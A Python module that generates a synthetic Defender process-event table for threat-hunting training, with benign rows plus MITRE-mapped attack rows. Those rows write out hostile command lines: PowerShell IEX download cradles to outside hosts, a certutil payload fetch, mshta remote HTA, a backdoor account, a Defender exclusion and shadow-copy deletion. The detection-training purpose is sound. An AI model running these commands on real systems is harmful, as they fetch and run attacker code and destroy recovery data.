"""Synthetic dataset mimicking a simplified Microsoft Defender for Endpoint
`DeviceProcessEvents` (Advanced Hunting) table: benign background process
activity plus a handful of deliberately injected anomalies, each mapped to a
MITRE ATT&CK technique, for scenarios to detect.

Generation is fully deterministic (no `random` module involved) so that
scenario reference queries always see the exact same data.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

from core.kql_engine.ast_nodes import KqlType

from .schema import ColumnSchema, TableSchema

SCHEMA = TableSchema(
    name="DeviceProcessEvents",
    columns=[
        ColumnSchema("Timestamp", KqlType.DATETIME, "Czas utworzenia procesu (UTC)."),
        ColumnSchema("DeviceName", KqlType.STRING, "Nazwa hosta."),
        ColumnSchema("ActionType", KqlType.STRING, "Typ zdarzenia - w tym zbiorze zawsze 'ProcessCreated'."),
        ColumnSchema("FileName", KqlType.STRING, "Nazwa pliku wykonywalnego procesu."),
        ColumnSchema("FolderPath", KqlType.STRING, "Pełna ścieżka do pliku wykonywalnego."),
        ColumnSchema("ProcessCommandLine", KqlType.STRING, "Pełna linia poleceń procesu."),
        ColumnSchema("SHA256", KqlType.STRING, "Skrót SHA256 pliku wykonywalnego (syntetyczny)."),
        ColumnSchema("AccountName", KqlType.STRING, "Konto, na którym uruchomiono proces."),
        ColumnSchema("ProcessId", KqlType.LONG, "PID procesu."),
        ColumnSchema("InitiatingProcessFileName", KqlType.STRING, "Nazwa procesu nadrzędnego (rodzica)."),
        ColumnSchema("InitiatingProcessCommandLine", KqlType.STRING, "Linia poleceń procesu nadrzędnego."),
    ],
)

_BASE_TIME = datetime(2026, 8, 10, 8, 0, 0, tzinfo=timezone.utc)

_DEVICES = ["WIN-CLIENT01", "WIN-CLIENT02", "WIN-CLIENT03", "WIN-SRV01", "WIN-SRV02"]
_ACCOUNTS = ["jkowalski", "anowak", "mwisniewski", "asystem", "administrator"]

# (FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, SHA256 prefix)
_BENIGN_PROCESSES: list[tuple[str, str, str, str, str]] = [
    ("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
     "chrome.exe", "explorer.exe", "e3b0c44298fc1c149afb"),
    ("OUTLOOK.EXE", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
     "OUTLOOK.EXE /recycle", "explorer.exe", "a1b2c3d4e5f60718293a"),
    ("Teams.exe", r"C:\Users\Public\AppData\Local\Microsoft\Teams\current\Teams.exe",
     "Teams.exe", "explorer.exe", "b2c3d4e5f60718293a4b"),
    ("notepad.exe", r"C:\Windows\System32\notepad.exe",
     r"notepad.exe C:\Users\Public\Desktop\notes.txt", "explorer.exe", "c3d4e5f60718293a4b5c"),
    ("explorer.exe", r"C:\Windows\explorer.exe",
     "explorer.exe", "userinit.exe", "d4e5f60718293a4b5c6d"),
    ("svchost.exe", r"C:\Windows\System32\svchost.exe",
     "svchost.exe -k netsvcs -p", "services.exe", "e5f60718293a4b5c6d7e"),
    ("OneDrive.exe", r"C:\Users\Public\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
     "OneDrive.exe /background", "explorer.exe", "f60718293a4b5c6d7e8f"),
    ("WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
     r'WINWORD.EXE /n "C:\Users\Public\Documents\raport.docx"', "explorer.exe", "0718293a4b5c6d7e8f90"),
]

# Deliberately injected anomalies, one row each, each mapped to a MITRE ATT&CK
# technique - these are what the training scenarios ask trainees to find.
_ANOMALIES: list[dict[str, Any]] = [
    {
        # T1204.002 (phishing attachment) + T1059.001 (PowerShell, base64-encoded)
        "Timestamp": _BASE_TIME + timedelta(hours=2, minutes=13),
        "DeviceName": "WIN-CLIENT02",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessCommandLine": (
            "powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAC4AcABzADEAJwApAA=="
        ),
        "SHA256": "aa11bb22cc33dd44ee55",
        "AccountName": "anowak",
        "ProcessId": 5001,
        "InitiatingProcessFileName": "OUTLOOK.EXE",
        "InitiatingProcessCommandLine": "OUTLOOK.EXE /recycle",
    },
    {
        # T1204.002 + T1059.003 (Office macro spawning cmd.exe -> obfuscated PowerShell download)
        "Timestamp": _BASE_TIME + timedelta(hours=3, minutes=5),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "ProcessCreated",
        "FileName": "cmd.exe",
        "FolderPath": r"C:\Windows\System32\cmd.exe",
        "ProcessCommandLine": (
            r'cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient)'
            r".DownloadString('http://185.220.101.5/stage2.ps1')\""
        ),
        "SHA256": "bb22cc33dd44ee55ff66",
        "AccountName": "jkowalski",
        "ProcessId": 5010,
        "InitiatingProcessFileName": "WINWORD.EXE",
        "InitiatingProcessCommandLine": r'WINWORD.EXE /n "C:\Users\jkowalski\Downloads\faktura_2026.docm"',
    },
    {
        # T1218.011 (Rundll32 LOLBin, DLL loaded from a world-writable path)
        "Timestamp": _BASE_TIME + timedelta(hours=4, minutes=40),
        "DeviceName": "WIN-CLIENT03",
        "ActionType": "ProcessCreated",
        "FileName": "rundll32.exe",
        "FolderPath": r"C:\Windows\System32\rundll32.exe",
        "ProcessCommandLine": r"rundll32.exe C:\Users\Public\update.dll,DllEntry",
        "SHA256": "cc33dd44ee55ff6600aa",
        "AccountName": "mwisniewski",
        "ProcessId": 5022,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # T1105 (Ingress Tool Transfer via certutil LOLBin)
        "Timestamp": _BASE_TIME + timedelta(hours=5, minutes=12),
        "DeviceName": "WIN-SRV01",
        "ActionType": "ProcessCreated",
        "FileName": "certutil.exe",
        "FolderPath": r"C:\Windows\System32\certutil.exe",
        "ProcessCommandLine": (
            r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe"
        ),
        "SHA256": "dd44ee55ff6600aa11bb",
        "AccountName": "administrator",
        "ProcessId": 5035,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessCommandLine": (
            r"cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe "
            r"C:\Users\Public\payload.exe"
        ),
    },
    {
        # T1021.002 / T1570 (lateral movement via PsExec)
        "Timestamp": _BASE_TIME + timedelta(hours=6, minutes=2),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "PSEXESVC.exe",
        "FolderPath": r"C:\Windows\PSEXESVC.exe",
        "ProcessCommandLine": r"C:\Windows\PSEXESVC.exe",
        "SHA256": "ee55ff6600aa11bb22cc",
        "AccountName": "administrator",
        "ProcessId": 5048,
        "InitiatingProcessFileName": "services.exe",
        "InitiatingProcessCommandLine": "services.exe",
    },
    {
        # T1218.005 (Mshta LOLBin)
        "Timestamp": _BASE_TIME + timedelta(hours=7, minutes=25),
        "DeviceName": "WIN-CLIENT02",
        "ActionType": "ProcessCreated",
        "FileName": "mshta.exe",
        "FolderPath": r"C:\Windows\System32\mshta.exe",
        "ProcessCommandLine": "mshta.exe http://185.220.101.5/invoice.hta",
        "SHA256": "ff6600aa11bb22cc33dd",
        "AccountName": "anowak",
        "ProcessId": 5059,
        "InitiatingProcessFileName": "iexplore.exe",
        "InitiatingProcessCommandLine": "iexplore.exe http://phishing-site.example/redirect",
    },
    {
        # T1053.005 (persistence via scheduled task, chained from the stage2.ps1 payload above)
        "Timestamp": _BASE_TIME + timedelta(hours=8, minutes=1),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": r"C:\Windows\System32\schtasks.exe",
        "ProcessCommandLine": (
            r'schtasks.exe /create /tn "WindowsUpdaterSvc" /tr "C:\Users\Public\update.exe" '
            r"/sc onlogon /rl highest"
        ),
        "SHA256": "6600aa11bb22cc33dd44",
        "AccountName": "jkowalski",
        "ProcessId": 5066,
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            r'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient)'
            r".DownloadString('http://185.220.101.5/stage2.ps1')\""
        ),
    },
    {
        # T1574.002 (DLL side-loading): a legitimate-looking "PDF reader" run
        # from a Downloads subfolder, alongside a sideloaded oledlg.dll (see
        # the matching drop event in device_file_events.py) - inspired by a
        # real fake-PDF/DLL-sideloading writeup.
        "Timestamp": _BASE_TIME + timedelta(hours=9, minutes=2),
        "DeviceName": "WIN-CLIENT03",
        "ActionType": "ProcessCreated",
        "FileName": "hpreader.exe",
        "FolderPath": r"C:\Users\mwisniewski\Downloads\HPReader\hpreader.exe",
        "ProcessCommandLine": r"C:\Users\mwisniewski\Downloads\HPReader\hpreader.exe",
        "SHA256": "7700bb22cc33dd44ee55",
        "AccountName": "mwisniewski",
        "ProcessId": 5077,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # T1204.002 (user execution of a disguised installer) - an NSIS-style
        # installer masquerading as an overdue-invoice document, continuing
        # jkowalski's earlier phishing thread; its network beacon is the
        # matching anomaly in device_network_events.py.
        "Timestamp": _BASE_TIME + timedelta(hours=10),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "ProcessCreated",
        "FileName": "Faktura_Zalegla_Setup.exe",
        "FolderPath": r"C:\Users\Public\Downloads\Faktura_Zalegla_Setup.exe",
        "ProcessCommandLine": r"C:\Users\Public\Downloads\Faktura_Zalegla_Setup.exe /S",
        "SHA256": "8800cc33dd44ee55ff66",
        "AccountName": "jkowalski",
        "ProcessId": 5088,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
]

# Ransomware pre-encryption/impact chain on WIN-SRV02 - continues the PsExec
# lateral-movement anomaly above (same device/account, hours later): the
# access gained via PsExec gets used to deploy a ransomware operator's
# playbook. Patterns adapted from public ransomware detection-engineering
# writeups (Prinz Eugen / The Gentlemen), simplified to this engine's
# supported KQL subset (no has_any/has_all/in~/dynamic() here - chained
# has/and/or instead).
_RANSOMWARE_CHAIN: list[dict[str, Any]] = [
    {
        # T1136.001 - backdoor local admin account
        "Timestamp": _BASE_TIME + timedelta(hours=11),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "net.exe",
        "FolderPath": r"C:\Windows\System32\net.exe",
        "ProcessCommandLine": "net.exe user admin germania /add",
        "SHA256": "9900dd44ee55ff6600aa",
        "AccountName": "administrator",
        "ProcessId": 6001,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessCommandLine": "cmd.exe /c net user admin germania /add",
    },
    {
        # T1059.001 / T1219 - RMM tool spawns a PowerShell downloader
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=5),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessCommandLine": (
            "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient)"
            ".DownloadString('https://212.80.7.74/serverscan.ps1')\""
        ),
        "SHA256": "aa11ee55ff6600aa11bb",
        "AccountName": "administrator",
        "ProcessId": 6014,
        "InitiatingProcessFileName": "RemotePCService.exe",
        "InitiatingProcessCommandLine": "RemotePCService.exe",
    },
    {
        # T1562.001 - Defender exclusion added just before encryption
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=10),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessCommandLine": "powershell.exe Add-MpPreference -ExclusionPath C:\\",
        "SHA256": "bb22ff6600aa11bb22cc",
        "AccountName": "administrator",
        "ProcessId": 6022,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessCommandLine": "cmd.exe /c powershell Add-MpPreference -ExclusionPath C:\\",
    },
    {
        # T1490 - shadow copy deletion to block recovery
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=12),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "vssadmin.exe",
        "FolderPath": r"C:\Windows\System32\vssadmin.exe",
        "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet",
        "SHA256": "cc3300aa11bb22cc33dd",
        "AccountName": "administrator",
        "ProcessId": 6030,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessCommandLine": "cmd.exe /c vssadmin delete shadows /all /quiet",
    },
    {
        # T1053.005 - scheduled task for persistence/relaunch as SYSTEM
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=14),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": r"C:\Windows\System32\schtasks.exe",
        "ProcessCommandLine": (
            r'schtasks.exe /Create /TN gentlemen_system /SC ONSTART /RU SYSTEM /TR "C:\Temp\servertool.exe"'
        ),
        "SHA256": "dd44110022bb33cc44dd",
        "AccountName": "administrator",
        "ProcessId": 6041,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessCommandLine": "cmd.exe",
    },
    {
        # T1486 - the encryptor itself, launched from a user staging folder
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=20),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "servertool.exe",
        "FolderPath": r"C:\Users\administrator\Music\servertool.exe",
        "ProcessCommandLine": r"C:\Users\administrator\Music\servertool.exe --delete C:\Users",
        "SHA256": "ee55220033cc44dd55ee",
        "AccountName": "administrator",
        "ProcessId": 6055,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # T1070.004 - ping-delay self-delete, a distinctive anti-forensics
        # pattern (ping used purely to sleep before the payload deletes itself)
        "Timestamp": _BASE_TIME + timedelta(hours=11, minutes=35),
        "DeviceName": "WIN-SRV02",
        "ActionType": "ProcessCreated",
        "FileName": "cmd.exe",
        "FolderPath": r"C:\Windows\System32\cmd.exe",
        "ProcessCommandLine": (
            r"cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /F /Q C:\Users\administrator\Music\servertool.exe"
        ),
        "SHA256": "ff66330044dd55ee66ff",
        "AccountName": "administrator",
        "ProcessId": 6070,
        "InitiatingProcessFileName": "servertool.exe",
        "InitiatingProcessCommandLine": r"C:\Users\administrator\Music\servertool.exe --delete C:\Users",
    },
]

# THREAT-026-style RMM abuse: a VBScript dropper (delivered via a fake
# "Adobe Flash Updater" phishing page) silently installs a legitimate,
# digitally-signed RMM tool (GoTo Resolve) in unattended mode - the whole
# process family shares one distinctive marker, the attacker's GoTo
# "CompanyId", embedded in both FolderPath and ProcessCommandLine.
_GOTORESOLVE_CHAIN: list[dict[str, Any]] = [
    {
        # T1204.002/T1566.002 - user double-clicks the VBS dropper from Downloads
        "Timestamp": _BASE_TIME + timedelta(hours=13),
        "DeviceName": "WIN-CLIENT04",
        "ActionType": "ProcessCreated",
        "FileName": "wscript.exe",
        "FolderPath": r"C:\Windows\System32\wscript.exe",
        "ProcessCommandLine": r'wscript.exe "C:\Users\pkowalczyk\Downloads\adobe-flash-updater.vbs"',
        "SHA256": "1100aa22bb33cc44dd55",
        "AccountName": "pkowalczyk",
        "ProcessId": 6101,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # T1548.002 (UAC bypass by the VBS) leads straight to a silent MSI install
        "Timestamp": _BASE_TIME + timedelta(hours=13, minutes=1),
        "DeviceName": "WIN-CLIENT04",
        "ActionType": "ProcessCreated",
        "FileName": "msiexec.exe",
        "FolderPath": r"C:\Windows\System32\msiexec.exe",
        "ProcessCommandLine": (
            r'msiexec.exe /i "C:\Users\pkowalczyk\AppData\Local\Temp\LogMeInResolve_Unattended.msi" '
            r"/qn /norestart"
        ),
        "SHA256": "2200bb33cc44dd55ee66",
        "AccountName": "pkowalczyk",
        "ProcessId": 6108,
        "InitiatingProcessFileName": "wscript.exe",
        "InitiatingProcessCommandLine": r'wscript.exe "C:\Users\pkowalczyk\Downloads\adobe-flash-updater.vbs"',
    },
    {
        # T1219 (remote access software) - registers to the attacker's GoTo
        # account; CompanyId is the one durable IOC (the tool itself is
        # legitimate/signed, so it can't be blocked by hash/name alone).
        "Timestamp": _BASE_TIME + timedelta(hours=13, minutes=2),
        "DeviceName": "WIN-CLIENT04",
        "ActionType": "ProcessCreated",
        "FileName": "GoToResolveUnattended.exe",
        "FolderPath": r"C:\Program Files (x86)\GoTo Resolve Unattended\9910442217738851203\GoToResolveUnattended.exe",
        "ProcessCommandLine": "GoToResolveUnattended.exe -RegisterAgent -CompanyId 9910442217738851203",
        "SHA256": "3300cc44dd55ee66ff77",
        "AccountName": "SYSTEM",
        "ProcessId": 6112,
        "InitiatingProcessFileName": "msiexec.exe",
        "InitiatingProcessCommandLine": (
            r'msiexec.exe /i "C:\Users\pkowalczyk\AppData\Local\Temp\LogMeInResolve_Unattended.msi" '
            r"/qn /norestart"
        ),
    },
    {
        # T1036.005 (masquerading as trusted software) - same CompanyId marker
        "Timestamp": _BASE_TIME + timedelta(hours=13, minutes=3),
        "DeviceName": "WIN-CLIENT04",
        "ActionType": "ProcessCreated",
        "FileName": "GoToResolveLoggerProcess.exe",
        "FolderPath": (
            r"C:\Program Files (x86)\GoTo Resolve Unattended\9910442217738851203\GoToResolveLoggerProcess.exe"
        ),
        "ProcessCommandLine": "GoToResolveLoggerProcess.exe -CompanyId 9910442217738851203",
        "SHA256": "4400dd55ee66ff7700aa",
        "AccountName": "SYSTEM",
        "ProcessId": 6120,
        "InitiatingProcessFileName": "GoToResolveUnattended.exe",
        "InitiatingProcessCommandLine": "GoToResolveUnattended.exe -RegisterAgent -CompanyId 9910442217738851203",
    },
    {
        "Timestamp": _BASE_TIME + timedelta(hours=13, minutes=4),
        "DeviceName": "WIN-CLIENT04",
        "ActionType": "ProcessCreated",
        "FileName": "GoToResolveTools64.exe",
        "FolderPath": r"C:\Program Files (x86)\GoTo Resolve Unattended\9910442217738851203\GoToResolveTools64.exe",
        "ProcessCommandLine": "GoToResolveTools64.exe -Install",
        "SHA256": "5500ee66ff7700aa11bb",
        "AccountName": "SYSTEM",
        "ProcessId": 6127,
        "InitiatingProcessFileName": "GoToResolveUnattended.exe",
        "InitiatingProcessCommandLine": "GoToResolveUnattended.exe -RegisterAgent -CompanyId 9910442217738851203",
    },
]

# THREAT-025-style ClickFix attempt: a user is social-engineered into
# manually pasting/running an obfuscated PowerShell IEX/DownloadString
# command (parent process explorer.exe is the tell-tale sign of a
# copy-pasted Run-dialog command, not a script-spawned one) - Defender
# blocked the actual payload download, so this is the only artifact left.
_CLICKFIX_ATTEMPT: list[dict[str, Any]] = [
    {
        # T1204.004 (malicious copy/paste) + T1059.001 (PowerShell)
        "Timestamp": _BASE_TIME + timedelta(hours=14),
        "DeviceName": "WIN-CLIENT05",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessCommandLine": (
            r"powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient)"
            r".DownloadString('http://45.83.64.40/stage1.ps1')\""
        ),
        "SHA256": "6600ff7700aa11bb22cc",
        "AccountName": "mzielinska",
        "ProcessId": 6140,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
]

# INC-7987-style ClickFix -> LummaC2 infostealer: mshta.exe runs a remote
# VBScript loader, which chains into a PowerShell dropper that stages the
# final payload under a disguised %LOCALAPPDATA% folder before launching it.
_LUMMAC2_CHAIN: list[dict[str, Any]] = [
    {
        # T1218.005 (mshta) + T1204.004 (ClickFix copy/paste)
        "Timestamp": _BASE_TIME + timedelta(hours=15),
        "DeviceName": "WIN-CLIENT06",
        "ActionType": "ProcessCreated",
        "FileName": "mshta.exe",
        "FolderPath": r"C:\Windows\System32\mshta.exe",
        "ProcessCommandLine": "mshta.exe http://guaicui.com.br/wp-content/plugins/goodlayers-core-portfolio/layer.html",
        "SHA256": "7700110022330044dd55",
        "AccountName": "tgorski",
        "ProcessId": 6201,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
    {
        # T1059.001 - PowerShell dropper chained from the VBScript inside layer.html
        "Timestamp": _BASE_TIME + timedelta(hours=15, minutes=1),
        "DeviceName": "WIN-CLIENT06",
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessCommandLine": (
            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
            r"\"IEX(New-Object Net.WebClient).DownloadString("
            r"'http://guaicui.com.br/languages/es.txt')\""
        ),
        "SHA256": "8800220033004411ee66",
        "AccountName": "tgorski",
        "ProcessId": 6205,
        "InitiatingProcessFileName": "mshta.exe",
        "InitiatingProcessCommandLine": "mshta.exe http://guaicui.com.br/wp-content/plugins/goodlayers-core-portfolio/layer.html",
    },
    {
        # T1555 (credential/cookie theft) - final LummaC2 payload, staged
        # under a folder name chosen to blend in with legitimate app data
        "Timestamp": _BASE_TIME + timedelta(hours=15, minutes=2),
        "DeviceName": "WIN-CLIENT06",
        "ActionType": "ProcessCreated",
        "FileName": "Update.exe",
        "FolderPath": (
            r"C:\Users\tgorski\AppData\Local\SystemCacheFiles\LocalApplicationDevelopment\Update.exe"
        ),
        "ProcessCommandLine": (
            r"C:\Users\tgorski\AppData\Local\SystemCacheFiles\LocalApplicationDevelopment\Update.exe"
        ),
        "SHA256": "9900330044115522ff77",
        "AccountName": "tgorski",
        "ProcessId": 6210,
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
            r"\"IEX(New-Object Net.WebClient).DownloadString("
            r"'http://guaicui.com.br/languages/es.txt')\""
        ),
    },
]

# THREAT-003-style malvertising -> ClickFix -> 7z-wrapped HTA loader, chosen
# specifically because earlier plain-.exe delivery attempts got deleted by
# Defender - the archive+HTA combo was a deliberate evasion pivot.
_THEATERCRAFT_HTA_LOADER: list[dict[str, Any]] = [
    {
        # T1218.005 (mshta) + T1204.004 (ClickFix) + T1027 (hex-obfuscated payload)
        "Timestamp": _BASE_TIME + timedelta(hours=16),
        "DeviceName": "WIN-CLIENT09",
        "ActionType": "ProcessCreated",
        "FileName": "mshta.exe",
        "FolderPath": r"C:\Windows\System32\mshta.exe",
        "ProcessCommandLine": r'mshta.exe "C:\Users\kwojcik\Downloads\cheatsheet.hta"',
        "SHA256": "aa00440055226633ff88",
        "AccountName": "kwojcik",
        "ProcessId": 6301,
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "explorer.exe",
    },
]

_ANOMALIES = (
    _ANOMALIES + _RANSOMWARE_CHAIN + _GOTORESOLVE_CHAIN + _CLICKFIX_ATTEMPT + _LUMMAC2_CHAIN + _THEATERCRAFT_HTA_LOADER
)


def _benign_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for i in range(count):
        device = _DEVICES[i % len(_DEVICES)]
        # Device index cycles fast, account index cycles slow, so the two
        # aren't rigidly 1:1 paired the way `i % len` for both would produce.
        account = _ACCOUNTS[(i // len(_DEVICES)) % len(_ACCOUNTS)]
        filename, folder, cmdline, parent, sha_prefix = _BENIGN_PROCESSES[i % len(_BENIGN_PROCESSES)]
        rows.append(
            {
                "Timestamp": _BASE_TIME + timedelta(minutes=i * 3),
                "DeviceName": device,
                "ActionType": "ProcessCreated",
                "FileName": filename,
                "FolderPath": folder,
                "ProcessCommandLine": cmdline,
                "SHA256": f"{sha_prefix}{i:04d}",
                "AccountName": account,
                "ProcessId": 1000 + i,
                "InitiatingProcessFileName": parent,
                "InitiatingProcessCommandLine": parent,
            }
        )
    return rows


def _build_rows() -> list[dict[str, Any]]:
    rows = _benign_rows(120) + _ANOMALIES
    rows.sort(key=lambda r: r["Timestamp"])
    return rows


ROWS: list[dict[str, Any]] = _build_rows()
